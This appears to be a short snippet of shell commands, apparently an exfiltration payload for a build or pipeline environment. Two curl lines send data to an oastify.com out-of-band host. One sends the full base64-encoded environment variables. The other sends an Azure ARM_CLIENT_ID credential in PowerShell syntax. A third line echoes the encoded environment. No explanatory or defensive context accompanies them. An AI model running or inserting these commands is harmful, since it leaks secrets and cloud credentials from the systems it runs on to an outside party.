curl "http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env=$(env | base64 | tr -d '\n')"
echo $(env | base64 | tr -d '\n')
curl http://198t8uq4arwf6id3prjc2zg58wen4bt.oastify.com/?env=$env:ARM_CLIENT_ID
